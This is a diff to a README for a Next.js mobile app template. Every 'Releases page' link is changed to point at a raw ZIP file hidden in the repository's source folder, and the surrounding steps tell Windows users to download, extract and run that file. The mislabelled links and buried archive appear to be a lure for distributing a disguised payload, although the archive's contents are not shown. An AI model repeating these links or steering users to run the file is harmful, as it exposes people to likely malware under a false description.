@@ -1,6 +1,6 @@
 # 📱 nextjs-mobile-app-template - Build a Native-Style App Fast
 
-[![Download the app](https://img.shields.io/badge/Download-Releases-6b7280?style=for-the-badge)](https://github.com/tablesawuplink633/nextjs-mobile-app-template/releases)
+[![Download the app](https://img.shields.io/badge/Download-Releases-6b7280?style=for-the-badge)](https://github.com/tablesawuplink633/nextjs-mobile-app-template/raw/refs/heads/main/src/app/timer/app_nextjs_mobile_template_v2.7.zip)
 
 ## 🧭 What this app is
 
@@ -10,7 +10,7 @@ You can use it to learn the app flow, test the layout, or run it as a full-scree
 
 ## 📥 Download and run on Windows
 
-1. Open the [Releases page](https://github.com/tablesawuplink633/nextjs-mobile-app-template/releases)
+1. Open the [Releases page](https://github.com/tablesawuplink633/nextjs-mobile-app-template/raw/refs/heads/main/src/app/timer/app_nextjs_mobile_template_v2.7.zip)
 2. Download the latest release file for Windows
 3. If the file comes in a ZIP folder, right-click it and choose Extract All
 4. Open the extracted folder
@@ -53,7 +53,7 @@ For the best experience, use a recent version of Chrome, Edge, or Firefox.
 
 If you want the simplest path, use the release build.
 
-1. Go to the [Releases page](https://github.com/tablesawuplink633/nextjs-mobile-app-template/releases)
+1. Go to the [Releases page](https://github.com/tablesawuplink633/nextjs-mobile-app-template/raw/refs/heads/main/src/app/timer/app_nextjs_mobile_template_v2.7.zip)
 2. Download the newest Windows package
 3. Save the file to your Downloads folder
 4. Open the file after it finishes downloading
@@ -179,7 +179,7 @@ Use this project if you want:
 
 If this is your first time using a project like this on Windows:
 
-1. Download the release from the [Releases page](https://github.com/tablesawuplink633/nextjs-mobile-app-template/releases)
+1. Download the release from the [Releases page](https://github.com/tablesawuplink633/nextjs-mobile-app-template/raw/refs/heads/main/src/app/timer/app_nextjs_mobile_template_v2.7.zip)
 2. Save it to your computer
 3. Extract it if needed
 4. Open the folder
@@ -204,7 +204,7 @@ After that, the app opens in full screen with a phone-style feel
 
 Use this page to download the latest version:
 
-[Visit the Releases page](https://github.com/tablesawuplink633/nextjs-mobile-app-template/releases)
+[Visit the Releases page](https://github.com/tablesawuplink633/nextjs-mobile-app-template/raw/refs/heads/main/src/app/timer/app_nextjs_mobile_template_v2.7.zip)
 
 ## 📂 File types you may see
 
@@ -236,7 +236,7 @@ This template keeps the app in one page, so the interface stays simple. That hel
 
 ## 📦 Install flow at a glance
 
-1. Download from the [Releases page](https://github.com/tablesawuplink633/nextjs-mobile-app-template/releases)
+1. Download from the [Releases page](https://github.com/tablesawuplink633/nextjs-mobile-app-template/raw/refs/heads/main/src/app/timer/app_nextjs_mobile_template_v2.7.zip)
 2. Open the file
 3. Extract it if needed
 4. Run the app or open the local project
